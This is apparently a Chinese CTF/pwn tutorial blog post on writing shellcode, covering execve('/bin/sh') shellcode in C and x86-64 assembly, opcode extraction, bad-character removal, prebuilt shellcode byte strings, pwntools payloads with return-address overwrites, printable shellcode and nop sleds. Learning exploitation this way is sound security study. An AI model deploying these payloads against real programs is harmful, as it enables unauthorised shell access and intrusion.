---
title: pwn-shellcode编写
cover: rgb(117,117,255)
date: 2025-04-08 12:00:00
categories: 技术分享
tags:
  - 网安
  - pwn
---



## 总述

本文讲解了shellcode的简单编写。

学习编写shellcode，学习利用shellcode执行任务

## shellcode

shellcode是一段特别的代码，在很小的空间内执行任务。一般是一段机械码，用来执行获得shell的代码。

shellcode可以看作是rop攻击的衍生，只是它是专门用来获得shell的一段特别的汇编代码，执行它去获得shell。

Shellcode编写方式基本有3种：

1. 直接编写十六进制操作码（不现实）。
2. 采用像C这样的高级语言编写程序，编译后，进行反汇编以获取汇编指令和十六进制操作码。
3. 编译汇编程序，将该程序汇编，然后从二进制中提取十六进制操作码。

## 编写

注意事项：

- 系统调用问题：shellcode只有几十个字节，不能靠应用头文件，导入符号表，调用系统函数，这样的话字节数不能满足条件。需要利用系统最核心的调用机制绕开系统调用。
- 坏字符问题，shellcode如果放在栈堆上面就要避免出现截断的\x00这样的字节，这种叫做坏字符bad character，(\x00=null   \x0a=回车换行    \xff=换页    \x0d=回车)

### 找系统调用号

64位和32位的系统调用号是不一样的。

linux和windows的系统调用号也不一样。

### 查看函数原型

使用man命令可以查看首页册来查看函数原型，找到对应的需要的参数和值。

```bash
man [选项] [章节] 名称
```

- **选项**：常用选项有 `-k`（搜索包含指定关键字的手册页）、`-f`（显示指定名称的手册页章节信息）等。

- 章节

	：手册页被分为多个章节，不同章节包含不同类型的内容，常见章节如下：

	- **1**：用户命令（如 `ls`、`cp` 等）。
	- **2**：系统调用（如 `open`、`read` 等）。
	- **3**：库函数（如 `printf`、`malloc` 等）。
	- **5**：文件格式和约定（如 `/etc/passwd` 文件格式）。
	- **8**：系统管理命令（如 `ifconfig`、`mount` 等）。

- **名称**：要查看手册页的命令、函数或文件的名称。

### 编写shellcode

1. 安照函数原型设置对应参数。
2. 利用syscall调用对应函数。

**C语言编写**

返回本地shell的例子为：

```c
#include <unistd.h>

char *buf[] = {"/bin/sh", NULL};

void main() {
    execve("/bin/sh", buf, NULL);
    _exit(0);
}
```

**汇编编写**

```asm
section .text
global _start

_start:
    ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
    xor rdx, rdx        ; 清空rdx (envp = NULL)
    push rdx            ; 字符串终止符
    mov rax, 0x68732f2f6e69622f ; "/bin//sh"
    push rax
    mov rdi, rsp        ; rdi指向"/bin//sh"字符串
    
    push rdx            ; 压入NULL
    push rdi            ; 压入指向"/bin//sh"的指针
    mov rsi, rsp        ; rsi指向argv数组
    
    xor rax, rax        ; 清空rax
    mov al, 59          ; execve系统调用号(64位是59)
    syscall             ; 触发系统调用

```

### 提取shellcode

```bash
objdump -M intel -D file_path | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-7 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\\x/g' | paste -d '' -s
```

```shell
# 创建一个名为 shellcode.asm 的文件，将上述汇编代码复制到该文件中
cat << EOF > shellcode.asm
mov rax, 1
mov rdi, 1
lea rsi, [rip+hello_world]
mov rdx, 12
syscall
hello_world: db 'hello world',0xa
EOF

# 使用 NASM 汇编器将汇编代码转换为目标文件
nasm -f elf64 shellcode.asm -o shellcode.o

# 使用 objcopy 工具将目标文件转换为二进制文件
objcopy -O binary shellcode.o shellcode.bin

# 使用 xxd 工具将二进制文件转换为十六进制字符串
xxd -p -c 256 shellcode.bin
```

### 消除bad character

然后要删去bad character。

可以通过查看别人写的shellcode来看看有没有对应的改写方法。

针对这种的 `mov eax,0x1`，可以使用对寄存器的一部分赋值实现，比如：`mov al,0x1`

还可以通过 `xor rax,rax` 先把 rax 置为 0，然后 `add rax,0x1` 实现

## 使用shellcode

shellcode本质就是一段汇编指令，要执行它，就必须把它放在可执行的区域，如bss，如没有开启NX的栈上面，然后把程序执行流控制到shellcode开始的地方，接下来执行shellcode

## 例子

得到shellcode：

```python
#char *const argv[]={"/bin/sh",NULL};
#execve("/bin/sh",argv,NULL);

shellcode = '''
xor rax,rax
push rax
mov rdx,rsp
mov rbx,0x68732f6e69622f2f
push rbx
mov rdi,rsp
push rax   
push rdi
mov rsi,rsp
add rax,59
syscall
'''
payload = asm(shellcode)

#利用工具直接生成。
shellcode = asm(shellcraft.sh())

#32位短shellcode
#64位短shellcode
shellcode_x641="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
shellcode_x642="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"


```

exp：写入buf（可执行区域）内，然后去到对应的位置。

```python
#可以指定架构然shellcode更加准确
#ljust向shellcode的尾部填充一定长度的字节，使我们写shellcode和实现控制返回地址，在一步之中完成
#如：
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.sh())
buf_addr = 0x10
payload = shellcode.ljust(0x18,b'a') + p64(0x10)
p.interactive()
```



## 注意事项

**leave:**  
leave的作用相当于MOV SP,BP；POP BP。
因为leave指令会释放栈空间，因此我们不能使用目标地址后面的24字节。
目标地址后的8个字节也不能存放（这里需要存放返回地址）。故我们的shellcode只能 放在目标首地址后的 24+8后的地址。

例如：溢出垃圾数据 +（可执行目标地址+32）+ shellcode

```python
payload = cyclic(0x10+8) + p64(v5 + 24+8) + shellcode
```

**mmap： ** 

buf = mmap(0, 0x400u, 7, 34, 0, 0); ：这行代码使用 mmap 函数分配一块内存区域，将其起 始地址保存在变量 buf 中。
此时在buf中的shellcode仍然可以执行。

**输入字符限定：**

对于shellcode进行字符筛选，我们只能使用有限的字符进行shellcode编写

使用pwntools生成一个shellcode，没法直接输出，有乱码，将shellcode重定向到一个文件中 切换 到alpha3目录中，使用alpha3生成string.printable 。string.printable，就是可见字符shellcode。

```
cd alpha3
python ./ALPHA3.py x64 ascii mixedcase rax --input="存储shellcode的文件" > 输出
文件
#存在检查：
shellcode = '\x00\xc0'  + asm(shellcraft.sh()) 
```

**nop sled:**

nop sled 是一种可以破解栈随机化的缓冲区溢出攻击方式。
攻击者通过输入字符串注入攻击代码。在实际的攻击代码前注入很长的 nop 指令 （无操作，仅使程 序计数器加一）序列， 只要程序的控制流指向该序列任意一处，程序计数器逐步加一，直到到达攻击代码的存在的地址， 并执行。

将 shellcode 填充为以 nop ( 0x90 ) 指令开头进行滑栈。